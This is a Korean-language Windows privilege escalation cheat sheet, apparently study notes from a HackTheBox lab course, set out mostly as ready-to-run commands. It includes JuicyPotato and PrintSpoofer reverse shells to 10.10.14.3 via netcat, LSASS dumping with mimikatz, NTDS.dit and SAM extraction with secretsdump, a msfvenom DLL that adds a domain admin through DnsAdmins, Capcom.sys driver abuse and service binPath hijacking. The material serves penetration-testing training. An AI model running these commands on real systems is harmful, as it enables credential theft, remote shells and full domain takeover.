# 유용한 도구

| 도구                                                                                                       | 설명                                                                                                                                                                                                                                                                                                                                                              |
| -------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Seatbelt](https://github.com/GhostPack/Seatbelt)                                                        | 다양한 로컬 권한 상승 검사를 수행하기 위한 C# 프로젝트                                                                                                                                                                                                                                                                                                                                |
| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | WinPEAS는 Windows 호스트에서 권한을 확대할 수 있는 가능한 경로를 검색하는 스크립트입니다. 모든 검사는 [여기에서 설명합니다.](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)                                                                                                                                                                                                      |
| [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)      | 잘못된 구성에 의존하는 일반적인 Windows 권한 상승 벡터를 찾기 위한 PowerShell 스크립트입니다. 또한 발견된 문제 중 일부를 악용하는 데 사용할 수도 있습니다.                                                                                                                                                                                                                                                               |
| [SharpUp](https://github.com/GhostPack/SharpUp)                                                          | PowerUp의 C# 버전                                                                                                                                                                                                                                                                                                                                                  |
| [JAWS](https://github.com/411Hall/JAWS)                                                                  | PowerShell 2.0으로 작성된 권한 상승 벡터를 열거하기 위한 PowerShell 스크립트                                                                                                                                                                                                                                                                                                          |
| [SessionGopher](https://github.com/Arvanaghi/SessionGopher)                                              | SessionGopher는 원격 액세스 도구에 저장된 세션 정보를 찾아 해독하는 PowerShell 도구입니다. PuTTY, WinSCP, SuperPuTTY, FileZilla, RDP 저장된 세션 정보를 추출합니다.                                                                                                                                                                                                                                      |
| [Watson](https://github.com/rasta-mouse/Watson)                                                          | Watson은 누락된 KB를 열거하고 권한 상승 취약점을 악용할 방법을 제안하도록 설계된 .NET 도구입니다.                                                                                                                                                                                                                                                                                                   |
| [LaZagne](https://github.com/AlessandroZ/LaZagne)                                                        | 웹 브라우저, 채팅 도구, 데이터베이스, Git, 이메일, 메모리 덤프, PHP, 시스템 관리 도구, 무선 네트워크 구성, 내부 Windows 암호 저장 메커니즘 등에서 로컬 머신에 저장된 암호를 검색하는 데 사용되는 도구                                                                                                                                                                                                                                    |
| [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)                        | WES-NG는 Windows의 `systeminfo` 유틸리티의 출력을 기반으로 하는 도구로, OS가 취약한 취약성 목록을 제공하며, 이러한 취약성에 대한 모든 익스플로잇도 포함합니다. Windows XP와 Windows 10 사이의 모든 Windows OS, Windows Server 대응 제품을 포함하여 지원됩니다.                                                                                                                                                                             |
| [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)         | 우리는 [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) , [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist) , [PsService를](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) 포함한 Sysinternals의 여러 도구를 열거에 사용할 것입니다.[](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) |

- `Seatbelt`와 `SharpUp`의 사전 컴파일된 바이너리([here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- `LaZagne`의 독립형 바이너리([here](https://github.com/AlessandroZ/LaZagne/releases/)

<br/><br/>
# 상황 인식

## 네트워크 정보

### 인터페이스, IP 주소, DNS 정보
```ipconfig /all```

### ARP 테이블
```arp -a```

### 라우팅 테이블
```route print```

## Enumerating Protections

### Windows Defender 상태 확인
```Get-MpComputerStatus```

### AppLocker 규칙 목록
```Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections```

### AppLocker 정책 테스트
```Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone```

<br/><br/>
# 초기 열거
- [Windows 명령 참조](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)

## 시스템 정보

### 작업 목록
```tasklist /svc```

### 모든 환경 변수 표시
```set```

### 자세한 구성 정보 보기
```systeminfo```

### 패치 및 업데이트
```wmic qfe```<br/>
PowerShell : ```Get-HotFix | ft -AutoSize```

### 설치된 프로그램
```wmic product get name```<br/>
PowerShell : ```Get-WmiObject -Class Win32_Product |  select Name, Version```

### 실행중인 프로세스 표시
```netstat -ano```

<br/><br/>
## 사용자 및 그룹 정보

### 로그인한 사용자
```query user```

### 현재 사용자
```echo %USERNAME%```

### 현재 사용자 권한
```whoami /priv```

### 현재 사용자 그룹 정보
```whoami /groups```

### 모든 사용자 가져오기
```net user```

### 모든 그룹 가져오기
```net localgroup```

### 그룹에 대한 세부 정보
```net localgroup administrators```

### 비밀번호 정책 및 기타 계정 정보 받기
```net accounts```

<br/><br/>
# Processes와 통신

## 네트워크 서비스 열거

### 활성 네트워크 연결 표시
```netstat -ano```

## Named Pipes

### Listing Named Pipes with Pipelist
- [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist)
```pipelist.exe /accepteula```

### Listing Named Pipes with PowerShell
```gci \\.\pipe\```

### Reviewing LSASS Named Pipe Permissions
- [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
```accesschk.exe /accepteula \\.\Pipe\lsass -v```

## Named Pipes Attack 예
- [WindscribeService Named Pipes 권한 확대](https://www.exploit-db.com/exploits/48021)

### WindscribeService Named Pipe Permissions 체크
```accesschk.exe -accepteula -w \pipe\WindscribeService -v```

<br/><br/>
# Windows 권한

## Windows의 권한 및 특권
| **그룹**                      | **설명**                                                                                                                                                                                                                                                        |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Default Administrators      | 도메인 관리자와 엔터프라이즈 관리자는 "슈퍼" 그룹입니다.                                                                                                                                                                                                                              |
| Server Operators            | 회원은 서비스를 수정하고, SMB 공유에 접근하고, 파일을 백업할 수 있습니다.                                                                                                                                                                                                                  |
| Backup Operators            | 멤버는 로컬 DC에 로그인할 수 있으며 도메인 관리자로 간주되어야 합니다. SAM/NTDS 데이터베이스의 섀도 복사본을 만들고, 원격으로 레지스트리를 읽고, SMB를 통해 DC의 파일 시스템에 액세스할 수 있습니다. 이 그룹은 때때로 비 DC의 로컬 Backup Operators 그룹에 추가됩니다.                                                                                       |
| Print Operators             | 멤버는 로컬로 DC에 로그온하여 Windows를 속여 악성 드라이버를 로드할 수 있습니다.                                                                                                                                                                                                            |
| Hyper-V Administrators      | 가상 DC가 있는 경우 Hyper-V 관리자 구성원과 같은 모든 가상화 관리자는 도메인 관리자로 간주되어야 합니다.                                                                                                                                                                                              |
| Account Operators           | 회원은 도메인 내의 보호되지 않은 계정과 그룹을 수정할 수 있습니다.                                                                                                                                                                                                                        |
| Remote Desktop Users        | 회원에게는 기본적으로 유용한 권한이 부여되지 않지만 `원격 데스크톱 서비스를 통한 로그인 허용`과 같은 추가 권한이 부여되는 경우가 많으며, RDP 프로토콜을 사용하여 측면으로 이동할 수 있습니다.                                                                                                                                                |
| Remote Management Users     | 멤버는 PSRemoting을 사용하여 DC에 로그온할 수 있습니다. 이 그룹은 때때로 비 DC의 로컬 원격 관리 그룹에 추가되기도 합니다.                                                                                                                                                                                 |
| Group Policy Creator Owners | 회원은 새로운 GPO를 만들 수 있지만 도메인이나 OU와 같은 컨테이너에 GPO를 연결하려면 추가 권한을 위임받아야 합니다.                                                                                                                                                                                         |
| Schema Admins               | 멤버는 Active Directory 스키마 구조를 수정하고 기본 개체 ACL에 손상된 계정을 추가하여 생성될 그룹/GPO에 백도어를 추가할 수 있습니다.                                                                                                                                                                        |
| DNS Admins                  | 멤버는 DC에 DLL을 로드할 수 있지만 DNS 서버를 다시 시작하는 데 필요한 권한이 없습니다. 악성 DLL을 로드하고 지속성 메커니즘으로 재부팅을 기다릴 수 있습니다. DLL을 로드하면 종종 서비스가 충돌합니다. 이 그룹을 악용하는 더 안정적인 방법은 [WPAD 레코드를 만드는](https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/) 것입니다 . |

<br/><br/>
## 사용자 권한 할당

| Setting [Constant](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) | Setting Name                                                                                                                                                                              | Standard Assignment                                     | 설명                                                                                                                                                                                              |
| ----------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| SeNetworkLogonRight                                                                             | [Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)               | Administrators, Authenticated Users                     | 네트워크에서 장치에 연결할 수 있는 사용자를 결정합니다. 이는 SMB, NetBIOS, CIFS 및 COM+와 같은 네트워크 프로토콜에 필요합니다.                                                                                                              |
| SeRemoteInteractiveLogonRight                                                                   | [Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services) | Administrators, Remote Desktop Users                    | 이 정책 설정은 원격 데스크톱 서비스 연결을 통해 원격 장치의 로그인 화면에 액세스할 수 있는 사용자 또는 그룹을 결정합니다. 사용자는 특정 서버에 원격 데스크톱 서비스 연결을 설정할 수 있지만 동일한 서버의 콘솔에 로그인할 수는 없습니다.                                                          |
| SeBackupPrivilege                                                                               | [Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)                               | Administrators                                          | 이 사용자 권한은 시스템 백업 목적으로 어떤 사용자가 파일 및 디렉터리, 레지스트리, 기타 영구 개체 사용 권한을 우회할 수 있는지 결정합니다.                                                                                                                |
| SeSecurityPrivilege                                                                             | [Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)                         | Administrators                                          | 이 정책 설정은 파일, Active Directory 개체, 레지스트리 키와 같은 개별 리소스에 대한 개체 액세스 감사 옵션을 지정할 수 있는 사용자를 결정합니다. 이러한 개체는 시스템 액세스 제어 목록(SACL)을 지정합니다. 이 사용자 권한이 할당된 사용자는 이벤트 뷰어에서 보안 로그를 보고 지울 수도 있습니다.               |
| SeTakeOwnershipPrivilege                                                                        | [Take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)         | Administrators                                          | 이 정책 설정은 Active Directory 개체, NTFS 파일 및 폴더, 프린터, 레지스트리 키, 서비스, 프로세스, 스레드 등 장치의 보안 가능한 개체에 대한 소유권을 어떤 사용자가 취득할 수 있는지 결정합니다.                                                                      |
| SeDebugPrivilege                                                                                | [Debug programs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs)                                                             | Administrators                                          | 이 정책 설정은 어떤 사용자가 소유하지 않은 프로세스라도 어떤 프로세스에 연결하거나 열 수 있는지 결정합니다. 애플리케이션을 디버깅하는 개발자는 이 사용자 권한이 필요하지 않습니다. 새로운 시스템 구성 요소를 디버깅하는 개발자는 이 사용자 권한이 필요합니다. 이 사용자 권한은 중요하고 중요한 운영 체제 구성 요소에 대한 액세스를 제공합니다. |
| SeImpersonatePrivilege                                                                          | [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)       | Administrators, Local Service, Network Service, Service | 이 정책 설정은 어떤 프로그램이 사용자 또는 다른 지정된 계정을 가장하고 사용자를 대신하여 작업할 수 있는지 결정합니다.                                                                                                                             |
| SeLoadDriverPrivilege                                                                           | [Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)                             | Administrators                                          | 이 정책 설정은 어떤 사용자가 장치 드라이버를 동적으로 로드하고 언로드할 수 있는지 결정합니다. 새 하드웨어에 대한 서명된 드라이버가 장치의 driver.cab 파일에 이미 있는 경우 이 사용자 권한은 필요하지 않습니다. 장치 드라이버는 매우 권한이 높은 코드로 실행됩니다.                                       |
| SeRestorePrivilege                                                                              | [Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)                               | Administrators                                          | 이 보안 설정은 백업된 파일과 디렉토리를 복원할 때 어떤 사용자가 파일, 디렉토리, 레지스트리 및 기타 영구 개체 권한을 우회할 수 있는지 결정합니다. 어떤 사용자가 개체의 소유자로 유효한 보안 주체를 설정할 수 있는지 결정합니다.                                                               |

- 특정 권한을 활성화하는 데 사용할 수 있는 [PowerShell 스크립트](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1)
- 토큰 권한을 조정하는 데 사용할 수 있는 [스크립트](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)

<br/><br/>
# SeImpersonate 및 SeAssignPrimaryToken

## SeImpersonate 예 - JuicyPotato

### MSSQLClient.py로 연결하기
- Impacket` 툴킷의 [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)
```mssqlclient.py sql_dev@10.129.43.30 -windows-auth```

### xp_cmdshell 활성화
```SQL> enable_xp_cmdshell```

### 액세스 확인
```SQL> xp_cmdshell whoami```

### Account 권한 체크
```xp_cmdshell whoami /priv```

### JuicyPotato를 사용한 권한 상승
- [JuicyPotato](https://github.com/ohpe/juicy-potato)는 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한을 악용하는 데 사용
```xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *```

### SYSTEM Shell 잡기
```sudo nc -lnvp 8443```

<br/><br/>
## PrintSpoofer와 RoguePotato
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [RoguePotato](https://github.com/antonioCoco/RoguePotato)

### PrintSpoofer를 사용하여 권한 확대
```xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"```

### SYSTEM으로 Reverse Shell 잡기
```nc -lnvp 8443```

<br/><br/>
# SeDebugPrivilege
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
```

- [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
```procdump.exe -accepteula -ma lsass.exe lsass.dmp```
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

<br/><br/>
## SYSTEM으로서의 원격 코드 실행
- SeDebugPrivilege for [RCE](https://decoder.cloud/2018/02/02/getting-system/)를 활용
- [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
- [PoC 스크립트 업데이트](https://github.com/decoder-it/psgetsystem)

```tasklist```<br/>
```. .\psgetsys.ps1```<br/>
```[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")```<br/>

- [다른 도구](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)

> 참고 사이트 1 : https://steflan-security.com/windows-privilege-escalation-cheat-sheet/<br/>
> 참고 사이트 2 : https://book.martiandefense.llc/notes/network-security/windows-privesc/windows-user-privileges 

<br/><br/>
# SeTakeOwnershipPrivilege

## 특권 활용

### 현재 사용자 권한 검토
```whoami /priv```

### SeTakeOwnershipPrivilege 활성화
- [블로그](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)
- [스크립트](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
- [개념 설명](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77)
```
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

### 대상 파일 선택
```Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}```

### 파일 소유권 확인
```cmd /c dir /q 'C:\Department Shares\Private\IT'```

### 파일 소유권 취득
```takeown /f 'C:\Department Shares\Private\IT\cred.txt'```

### 소유권 변경 확인
```Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}```

### 파일 ACL 수정
```cat 'C:\Department Shares\Private\IT\cred.txt'```<br/>
```icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F```

### 파일 읽기
```cat 'C:\Department Shares\Private\IT\cred.txt'```

## 언제 사용하나

### 관심 있는 파일
```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```
> `.kdbx` KeepPass 데이터베이스 파일, OneNote 노트북, `passwords.*`, `pass.*`, `creds.*`, scripts, 기타 구성 파일, 가상 하드 드라이브 파일 등 민감 정보가 있는 파일

<br/><br/>
# Windows Built-in Groups

## Backup Operators
- [PoC](https://github.com/giuliano108/SeBackupPrivilege)

### 라이브러리 가져오기
```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### SeBackupPrivilege가 활성화되어 있는지 확인
```whoami /priv```<br/>
```Get-SeBackupPrivilege```

### SeBackupPrivilege 활성화
```
Set-SeBackupPrivilege
Get-SeBackupPrivilege
whoami /priv
```

### 보호된 파일 복사
```
dir C:\Confidential\
cat 'C:\Confidential\2021 Contract.txt'
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

### 도메인 컨트롤러 공격 - NTDS.dit 복사
```
diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
```dir E:```

### NTDS.dit 로컬 복사
```Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit```

### SAM 및 SYSTEM 레지스트리 하이브 백업
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

### NTDS.dit에서 자격 증명 추출
```
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

### SecretsDump를 사용하여 해시 추출
```secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL```

<br/><br/>
## Robocopy

### Robocopy로 파일 복사하기
```robocopy /B E:\Windows\NTDS .\ntds ntds.dit```

<br/><br/>
# 이벤트 로그 리더

### 그룹 멤버십 확인
```net localgroup "Event Log Readers"```

### wevtutil을 사용하여 보안 로그 검색
```wevtutil qe Security /rd:true /f:text | Select-String "/user"```

### wevtutil에 자격 증명 전달
```wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"```

### Get-WinEvent를 사용하여 보안 로그 검색
```Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}```

<br/><br/>
# DNS 관리자

## DnsAdmins 액세스 활용

### 악성 DLL 생성
```msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll```

### 로컬 HTTP 서버 시작
```python3 -m http.server 7777```

### 대상에 파일 다운로드
```wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"```

### 권한이 없는 사용자로 DLL 로드 (실패)
```dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll```

### DnsAdmins의 멤버로 DLL 로딩
```Get-ADGroupMember -Identity DnsAdmins```

### 사용자 정의 DLL 로딩 (전체 경로 지정해야 함)
```dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll```

### 사용자의 SID 찾기
```wmic useraccount where name="netadm" get sid```

### DNS 서비스에 대한 권한 확인
```sc.exe sdshow DNS```

### DNS 서비스 중지
```sc stop dns```

### DNS 서비스 시작
```sc start dns```

### 그룹 멤버십 확인
```net group "Domain Admins" /dom```

<br/><br/>
## Cleaning Up

### 레지스트리 키 추가 확인
```reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters```

### 레지스트리 키 삭제
```reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll```

### DNS 서비스 다시 시작
```sc.exe start dns```

### DNS 서비스 상태 확인
```sc query dns```

<br/><br/>
## Mimilib.dll 사용하기
- 참고 : [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c)
```c
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```

<br/><br/>
## WPAD 레코드 생성

### 글로벌 쿼리 차단 목록 비활성화
```Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local```

### WPAD 레코드 추가
```Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3```

<br/><br/>
# Hyper-V 관리자

- 참고 : [블로그](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/)
- [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952)
- [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841)

### 대상 파일
```C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe```

### 파일 소유권 취득
```takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe```

### Mozilla 유지 관리 서비스 시작
```sc.exe start MozillaMaintenance```

<br/><br/>
# Print Operators

### 권한 확인
```whoami /priv```

### 권한 다시 확인
- [UACMe](https://github.com/hfiref0x/UACME)
```whoami /priv```

- [드라이버 로드 도구](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)
- 다운로드 후 아래 내용 붙여넣음
```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```
> Windows 10 버전 1803부터는 공격 불가

### cl.exe로 컴파일 (Visual Studio 2019)
```cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp```

### 드라이버에 참조 추가
- [Capcom.sys 다운로드](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
```reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"```

### 드라이버 로드 여부 확인
- [DriverView.exe 사용](http://www.nirsoft.net/utils/driverview.html)
```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

### Privilege is Enabled 확인
```EnableSeLoadDriverPrivilege.exe```

### Capcom Driver is Listed 확인
```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

### ExploitCapcom 도구를 사용하여 권한 확대
- Visual Studio로 컴파일한 후 [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) 도구를 사용
```.\ExploitCapcom.exe```

<br/><br/>
## 대체 익스플로잇 - GUI 없음
- `ExploitCapcom.cpp` 코드를 수정하여 `"C:\\Windows\\system32\\cmd.exe"`를 `msfvenom`으로 생성된 리버스 셸 바이너리)`c:\ProgramData\revshell.exe`)로 대체
```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```
```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

<br/><br/>
## 단계 자동화

### EopLoadDriver를 사용한 자동화
- [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/)
```EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys```<br/>
```.\ExploitCapcom.exe```

<br/><br/>
## Clean-up

### Removing Registry Key
```reg delete HKCU\System\CurrentControlSet\Capcom```

<br/><br/>
# Server Operators

### AppReadiness Service 쿼리
```sc qc AppReadiness```

### Service Permissions with PsService 체크
- [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)
```.\PsService.exe security AppReadiness```

### 로컬 관리자 그룹 멤버십 확인
```net localgroup Administrators```

### 서비스 바이너리 경로 수정
```sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"```

### 서비스 시작
```sc start AppReadiness```

### 로컬 관리자 그룹 멤버십 확인
```net localgroup Administrators```

### 도메인 컨트롤러에서 로컬 관리자 액세스 확인
```crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'```

### 도메인 컨트롤러에서 NTLM 암호 해시 검색
```secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator```


